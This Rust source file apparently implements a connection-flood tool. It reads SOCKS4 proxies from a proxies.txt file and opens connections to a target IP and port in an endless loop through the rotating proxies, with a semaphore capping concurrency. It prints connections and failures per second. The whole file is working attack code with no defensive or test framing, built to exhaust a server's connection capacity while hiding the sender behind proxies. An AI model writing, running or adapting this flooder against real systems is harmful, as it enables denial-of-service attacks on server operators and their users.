use std::{fs, net::SocketAddrV4, sync::atomic::Ordering, sync::Arc};
use std::{net::Ipv4Addr, sync::atomic::AtomicU64, time::Duration};

use clap::Parser;
use color_eyre::eyre::{Context, OptionExt};
use tokio::{
    sync::{OwnedSemaphorePermit, Semaphore},
    time::sleep,
};
use tokio_socks::{tcp::Socks4Stream, IntoTargetAddr};
use tracing::{error, info};

#[derive(Debug, Parser)]
struct Args {
    server_address: Ipv4Addr,
    server_port: u16,
    threads: u32,
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> color_eyre::Result<()> {
    color_eyre::install()?;
    tracing_subscriber::fmt::init();

    let args = Args::parse();
    let target = (args.server_address, args.server_port);
    let proxies = load_proxies()?;
    let connections = Arc::new(AtomicU64::new(0));
    let failures = Arc::new(AtomicU64::new(0));

    tokio::spawn(write_stats(connections.clone(), failures.clone()));
    let mut proxy_index = 0;
    let semaphore = Arc::new(Semaphore::new(args.threads as usize));
    loop {
        let permit = semaphore.clone().acquire_owned().await?;
        proxy_index = (proxy_index + 1) % proxies.len();
        let proxy = proxies[proxy_index];

        tokio::spawn(connect_to_proxy(
            proxy,
            target,
            connections.clone(),
            failures.clone(),
            permit,
        ));
    }
}

#[tracing::instrument(skip_all)]
async fn connect_to_proxy(
    proxy: SocketAddrV4,
    target: impl IntoTargetAddr<'_>,
    connections: Arc<AtomicU64>,
    failures: Arc<AtomicU64>,
    permit: OwnedSemaphorePermit,
) {
    match Socks4Stream::connect(proxy, target).await {
        Ok(_stream) => {
            connections.fetch_add(1, Ordering::Relaxed);
        }
        Err(err) => {
            failures.fetch_add(1, Ordering::Relaxed);
            error!("Failed to connect to proxy {proxy}: {err}");
        }
    }
    drop(permit);
}

#[tracing::instrument(skip_all)]
async fn write_stats(cps: Arc<AtomicU64>, fails: Arc<AtomicU64>) {
    loop {
        sleep(Duration::from_secs(1)).await;
        info!(
            "cps: {cps} fails: {fails}",
            cps = cps.swap(0, Ordering::Relaxed),
            fails = fails.swap(0, Ordering::Relaxed),
        );
    }
}

fn load_proxies() -> color_eyre::Result<Vec<SocketAddrV4>> {
    fs::read_to_string("proxies.txt")
        .wrap_err("couldn't find proxies.txt")?
        .lines()
        .map(|line| {
            let mut parts = line.split(":");
            let addr = parts.next().ok_or_eyre("missing server address")?;
            let port = parts.next().ok_or_eyre("missing port")?;

            let addr = addr
                .parse::<Ipv4Addr>()
                .wrap_err("couldn't parse target as ipv4 addr")?;
            let port = port
                .parse::<u16>()
                .wrap_err("couldn't parse port as an u16")?;
            Ok(SocketAddrV4::new(addr, port))
        })
        .collect()
}
